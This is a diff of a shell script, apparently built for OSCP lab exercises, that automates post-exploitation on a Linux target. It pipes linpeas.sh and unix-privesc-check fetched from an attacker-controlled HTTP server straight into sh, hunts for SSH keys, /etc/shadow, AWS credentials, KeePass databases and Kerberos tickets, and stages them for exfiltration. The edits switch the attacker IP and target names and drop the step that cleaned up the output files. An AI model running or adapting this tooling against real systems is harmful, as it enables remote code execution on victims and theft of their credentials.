@@ -19,17 +19,21 @@
 
 CMD_OUTPUT=""
 EXFIL_LOCATION="/tmp/slamit" # MUST BE A WRITEABLE LOCATION ON TARGET
+
+# Ensure the output directory exists
+mkdir -p "$EXFIL_LOCATION"
+
 OUTPUT_FILE="$EXFIL_LOCATION/slamit-sh-out.txt"
 OUTPUT_LINPEAS="$EXFIL_LOCATION/linpeas-out.txt"
 OUTPUT_UNIX_PRIVESC="$EXFIL_LOCATION/unix-privesc-check-out.txt"
-URI="192.168.45.216"
+URI="192.168.45.163"
 PORT=80
 URL="http://$URI:$PORT";        # Replace with your endpoint URL
 BASE_DIRECTORY="/home/kali/projects/oscp";
 MAIN_DIRECTORY="challenges";
-PROJECT_DIRECTORY="oscp_b";
+PROJECT_DIRECTORY="oscp_c";
 # HOSTNAME=$(hostname);
-HOSTNAME="Berlin"
+HOSTNAME="Charlie"
 TARGET_FOLDER="$BASE_DIRECTORY/$MAIN_DIRECTORY/$PROJECT_DIRECTORY/$HOSTNAME"
 BOUNDARY="----BOUNDARY-$$"
 DIVIDER="================================================================"
@@ -109,7 +113,7 @@ printSectionTitle()
 {
     # Header box follows here
     HEADER_NAME="$1";
-    WIDTH=90;
+    WIDTH=100;
     BORDER_CHAR="#";
     PADDING_CHAR=" ";
 
@@ -159,13 +163,16 @@ fi
 
 printSectionTitle "Automatic Enumeration"
 
-(
-  { $REQUEST_CMD "$URL/linpeas.sh"; echo "exit 0"; } | sh
-) >> "$OUTPUT_LINPEAS" 2>&1
+# Create output files first
+touch "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"
 
-(
-  { $REQUEST_CMD "$URL/unix-privesc-check"; echo "exit 0"; } | sh -s "detailed"
-) >> "$OUTPUT_UNIX_PRIVESC" 2>&1
+# Run linpeas and capture output
+echo "Running linpeas..."
+{ $REQUEST_CMD "$URL/linpeas.sh"; echo "exit 0"; } | sh >> "$OUTPUT_LINPEAS" 2>&1
+
+# Run unix-privesc-check and capture output
+echo "Running unix-privesc-check..."
+{ $REQUEST_CMD "$URL/unix-privesc-check"; echo "exit 0"; } | sh -s "detailed" >> "$OUTPUT_UNIX_PRIVESC" 2>&1
 
 echo "Automatic enumeration complete. Output written to:"
 echo "  - $OUTPUT_LINPEAS"
@@ -182,6 +189,8 @@ echo ""
 
 printSectionTitle "Manual Enumeration"
 
+# Create and initialize the output file
+touch "$OUTPUT_FILE"
 printSectionTitle "Manual Enumeration" >> "$OUTPUT_FILE";
 
 # Loop through each full command line
@@ -249,7 +258,7 @@ echo "Created staging directory: $STAGING_DIR"
 EXTENSIONS="pdf txt log zip doc docx xls xlsx ppt pptx csv ini conf cfg env
     yaml yml json xml kdbx rdp 7z rar tar gz bak old tmp db sqlite
     sqlite3 mdb accdb rtf md pem p12 pfx key crt cer p7b p7c
-    kerberoast kirb ccache hccapx wpa pcap pcapng cap";
+    kerberoast kirb ccache hccapx wpa pcap pcapng cap kbx";
 SPECIFIC_FILES="proof.txt local.txt id_rsa id_ecdsa id_ed25519 id_dsa \.git* /etc/passwd /etc/shadow
     .bash_history .zsh_history .mysql_history .psql_history .rediscli_history
     .ssh/known_hosts .ssh/config .aws/credentials .aws/config
@@ -269,8 +278,10 @@ for DIR in $DIRECTORIES; do
     FIND_CMD="$FIND_CMD $DIR";
 done
 
-# Build the find command dynamically
+# Build the find command dynamically - consolidate all searches into one command
 FIND_CMD="$FIND_CMD -type f ! -name linpeas.sh -readable \\(";
+
+# Add extension searches
 FIRST=1;
 for EXT in $EXTENSIONS; do
     if [ "$FIRST" -eq 1 ]; then
@@ -281,18 +292,20 @@ for EXT in $EXTENSIONS; do
     fi
 done
 
-FIND_CMD="$FIND_CMD \\) 2>/dev/null; ";
-
-# Search for specific files throughout the entire machine.
+# Add specific file searches
 for FILE in $SPECIFIC_FILES; do
-    FIND_CMD="$FIND_CMD find / -type f -readable -name \"$FILE\" 2>/dev/null; ";
+    FIND_CMD="$FIND_CMD -o -name \"$FILE\"";
 done
 
-# Include the output files needed.
+# Add output files (ensure they exist first)
 for FILE in "$OUTPUT_FILE" "$OUTPUT_LINPEAS" "$OUTPUT_UNIX_PRIVESC"; do
-    FILENAME=$(basename "$FILE");
-    FIND_CMD="$FIND_CMD find \"$EXFIL_LOCATION\" -name \"$FILENAME\" 2>/dev/null; ";
+    if [ -f "$FILE" ]; then
+        FILENAME=$(basename "$FILE");
+        FIND_CMD="$FIND_CMD -o -path \"$FILE\"";
+    fi
 done
+
+FIND_CMD="$FIND_CMD \\) 2>/dev/null";
 
 echo "Completed FIND_CMD = $FIND_CMD";
 
@@ -472,6 +485,9 @@ echo "  - $OUTPUT_LINPEAS"
 echo "  - $OUTPUT_UNIX_PRIVESC"
 echo ""
 
-# Tidy up
-rm -f $OUTPUT_FILE $OUTPUT_LINPEAS $OUTPUT_UNIX_PRIVESC;
+# Note: Output files are preserved for analysis
+# Files available at:
+#   - $OUTPUT_FILE
+#   - $OUTPUT_LINPEAS 
+#   - $OUTPUT_UNIX_PRIVESC
 exit 0;
